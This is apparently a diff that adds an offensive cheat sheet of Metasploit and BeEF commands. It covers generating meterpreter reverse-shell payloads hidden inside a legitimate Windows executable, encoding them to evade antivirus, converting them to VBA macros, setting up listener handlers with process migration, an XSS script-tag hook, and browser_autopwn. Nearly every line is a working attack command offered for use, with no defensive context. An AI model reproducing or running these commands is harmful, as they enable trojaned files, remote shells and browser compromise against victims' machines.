@@ -1,0 +1,34 @@
+msfvenom -h
+msfvenom -p windows/meterpreter/reverse_tcp -k -x original_file.exe LHOST=[YOUR_IP] LPORT=[PORT] -f exe -o clone_file.exe
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.124
+set LPORT 4555
+set ExitOnSession false
+exploit -j -z  
+msfconsole -q -r nameofyourfile  
+sessions -i 1
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.124 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe  
+Migrate script
+  use exploit/multi/handler 
+  set lhost 192.168.43.130
+  set lport 4444
+  set payload windows/meterpreter/reverse_tcp
+  set autorunscript migrate -n explorer.exe
+  exploit  
+msfconsole -q -r vbexploit.rc  
+root@kali:/usr/share/metasploit-framework/tools/exploit# ruby exe2vba.rb ~/attack.exe attack.vbs
+use exploit/multi/script/web_delivery
+load xssf
+<script  src="http://<ip>:8888/loop?interval=5"></script>
+msf> use auxiliary/xssf/public/misc/alert
+msf auxiliary(alert) > show options  
+root@kali:~# cd /usr/share/beef-xss/
+root@kali:/usr/share/beef-xss/~# ./beef  
+browser_autopwn
+      use auxiliary/server/browser_autopwn 
+      set LHOST 192.168.213.128 
+      set PAYLOAD_WIN32 
+      set PAYLOAD_JAVA 
+      exploit 
+      msfconsole -q -r beefexploit.rc 
